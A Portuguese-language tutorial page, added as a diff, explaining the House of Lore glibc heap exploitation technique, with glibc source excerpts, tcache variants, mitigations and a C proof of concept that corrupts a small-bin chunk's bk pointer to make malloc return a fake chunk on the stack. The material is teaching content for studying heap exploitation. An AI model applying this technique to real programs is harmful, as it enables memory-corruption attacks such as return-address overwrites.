@@ -1,0 +1,129 @@
+---
+title: The House of Lore
+sidebar_position: 4
+---
+
+House of Lore corrompe o `bk` de um chunk na **small bin** para que o `malloc` devolva um **chunk falso** em um endereço escolhido (a stack, por exemplo). É o equivalente, para listas duplas, do que o tcache poisoning e o fastbin dup fazem para listas simples. Funciona em todas as versões da glibc, com um passo a mais quando há tcache.
+
+## Como a small bin entrega chunks
+
+A small bin é uma lista dupla circular, FIFO: insere na cabeça (`fd` do bin) e remove da **cauda** (`bk` do bin).
+
+```c
+// _int_malloc, simplificado (glibc >= 2.26)
+if (in_smallbin_range(nb)) {
+    bin = bin_at(av, smallbin_index(nb));
+    if ((victim = last(bin)) != bin) {          // last(bin) == bin->bk
+        bck = victim->bk;
+        if (bck->fd != victim)                  // única verificação
+            malloc_printerr("malloc(): smallbin double linked list corrupted");
+        set_inuse_bit_at_offset(victim, nb);
+        bin->bk = bck;                          // o anterior de victim vira a nova cauda
+        bck->fd = bin;
+        // ... tcache: copia o resto da bin para o tcache (abaixo)
+        return chunk2mem(victim);
+    }
+}
+```
+
+O `malloc` confia no `bk` da vítima para saber qual é a nova cauda. Se `victim->bk` apontar para um chunk falso `F`, o `malloc` seguinte daquele tamanho devolve `F`. A única exigência é que `F->fd == victim`.
+
+<Side>
+  <Mem
+    title="Chunk falso na stack"
+    cellW={230}
+    rows={[
+      {addr: 'F', cells: [{label: 'prev_size', kind: 'meta'}, {label: 'size (qualquer)', kind: 'meta'}]},
+      {addr: 'F+0x10', cells: [{label: 'fd = victim', kind: 'ctrl'}, {label: 'bk = F2', kind: 'ctrl'}]},
+      {label: 'return address', kind: 'danger', note: 'o que você quer sobrescrever'},
+      {addr: 'F2', cells: [{label: 'prev_size', kind: 'meta'}, {label: 'size', kind: 'meta'}]},
+      {addr: 'F2+0x10', cells: [{label: 'fd = F', kind: 'ctrl'}, {label: 'bk', kind: 'neutral'}]},
+    ]}
+  />
+  <Mem
+    title="Vítima na small bin, com bk corrompido"
+    cellW={230}
+    rows={[
+      {addr: 'victim', cells: [{label: 'prev_size', kind: 'meta'}, {label: 'size', kind: 'meta'}]},
+      {addr: 'victim+0x10', cells: [{label: 'fd = bin', kind: 'ptr'}, {label: 'bk = F', kind: 'danger'}], note: 'UAF / overflow'},
+    ]}
+  />
+</Side>
+
+## Pré-requisitos
+
+1. Um chunk de tamanho de small bin (`0x90` a `0x3f0`, ou menor com o tcache cheio) **na small bin**: libere-o (vai para a unsorted bin) e peça um `malloc` de tamanho **diferente e maior**, que não é atendido pela unsorted bin; ao percorrê-la, o `malloc` move a vítima para a small bin.
+2. **Escrever no `bk` da vítima** depois disso: UAF de escrita ou overflow de um vizinho.
+3. **Saber o endereço do chunk falso** (leak da stack, se o falso está na stack) e **o endereço da vítima** (leak da heap), para montar `F->fd = victim`.
+4. Poder escrever o chunk falso: na stack, isso costuma ser um buffer local da função cujo endereço de retorno é o alvo.
+
+## O ataque (sem tcache, glibc < 2.26)
+
+1. `victim` está na small bin de tamanho `nb`.
+2. Escreva `victim->bk = F`, e em `F`: `F->fd = victim`, `F->bk = F2` com `F2->fd = F` (o segundo falso só serve para passar a mesma checagem na alocação seguinte).
+3. `malloc(nb)` devolve `victim` e faz `bin->bk = F`.
+4. `malloc(nb)` devolve `F`. Os dados do chunk começam em `F + 0x10`, então escreva a partir daí até o endereço de retorno.
+
+## Com tcache (glibc ≥ 2.26)
+
+Dois ajustes:
+
+- Para a vítima chegar à small bin, o tcache daquele tamanho precisa estar **cheio** (7 chunks) na hora do `free`. E para o `malloc` chegar à small bin, o tcache precisa estar **vazio** na hora da alocação. Encha, libere a vítima, esvazie.
+- Ao devolver a vítima, o `malloc` faz o **stash**: move os chunks restantes da small bin para o tcache até ele ter 7, seguindo os `bk` **sem verificar `bck->fd`** (glibc 2.26 a 2.28; a partir da 2.29, a verificação existe mas pode ser atendida com `F->fd = victim`). O chunk falso `F` entra no tcache nessa hora, e o `malloc(nb)` seguinte o devolve de lá.
+
+```c
+// o stash, dentro do caminho da small bin
+while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last(bin)) != bin) {
+    bck = tc_victim->bk;
+    set_inuse_bit_at_offset(tc_victim, nb);
+    bin->bk = bck;
+    bck->fd = bin;                 // escreve em F->bk->fd: F->bk precisa ser gravável
+    tcache_put(tc_victim, tc_idx);
+}
+```
+
+Para o loop parar depois do seu chunk falso, deixe o tcache com **6** chunks antes do `malloc` que pega a vítima: ele só tem espaço para um stash, que é `F`. Esse mesmo loop, usado com um `bk` falso e sem a vítima, é o **tcache stashing unlink attack**, que escreve um ponteiro da libc (`bin`) em `F->bk->fd`.
+
+## Exemplo
+
+```c
+// glibc 2.23 (sem tcache). Com tcache, encha o bin de 0x100 antes do free e esvazie antes do malloc.
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+    unsigned long fake[0x40];                       // "stack": chunk falso F e F2
+    unsigned long *F = fake, *F2 = fake + 8;
+
+    unsigned long *victim = malloc(0xf0);           // chunk de 0x100
+    malloc(0x20);                                   // barreira: não consolidar com o top
+
+    free(victim);                                   // unsorted bin
+    malloc(0x400);                                  // maior que victim: move victim para a small bin
+
+    // UAF de escrita: victim->bk = F
+    victim[1] = (unsigned long)F;
+    F[2] = (unsigned long)(victim - 2);             // F->fd = header de victim
+    F[3] = (unsigned long)F2;                       // F->bk = F2
+    F2[2] = (unsigned long)F;                       // F2->fd = F
+
+    malloc(0xf0);                                   // devolve victim
+    unsigned long *evil = malloc(0xf0);             // devolve F + 0x10 (dentro de fake[])
+    printf("fake: %p, evil: %p\n", (void *)fake, (void *)evil);
+}
+```
+
+## Mitigações
+
+- **`malloc(): smallbin double linked list corrupted`** (glibc 2.11): exige `F->fd == victim`, o que só custa um leak da heap.
+- **Tcache** (2.26): não impede, muda a coreografia (encher/esvaziar o bin).
+- Não existe Safe Linking para listas duplas, e não há verificação de que `F` esteja dentro da heap. Por isso a técnica continua válida; o que a torna rara é a quantidade de leaks e de controle necessários, quando um tcache poisoning resolve o mesmo problema com menos.
+
+A mesma ideia funciona na **large bin** (`bk` e `bk_nextsize`), com mais verificações a partir da glibc 2.30; é o largebin attack.
+
+## Resumo
+
+1. Leve um chunk à small bin (free → unsorted → malloc maior)
+2. `victim->bk = F`, `F->fd = victim`, `F->bk = F2`, `F2->fd = F`
+3. `malloc(nb)` devolve `victim`; `malloc(nb)` devolve `F`
